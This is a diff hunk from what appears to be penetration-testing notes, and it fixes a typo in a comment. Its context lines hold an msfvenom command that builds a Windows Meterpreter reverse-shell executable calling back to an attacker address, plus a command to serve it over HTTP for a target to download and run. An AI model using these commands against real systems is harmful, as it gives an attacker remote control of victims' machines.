@@ -18,7 +18,7 @@ run
 # attacker: terminal 2
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=443 -f exe -o rshell.exe
 sudo python3 -m http.server 8000
-# get the target to download and execute the paylosd
+# get the target to download and execute the payload
 ```
 
 **Meterpreter**
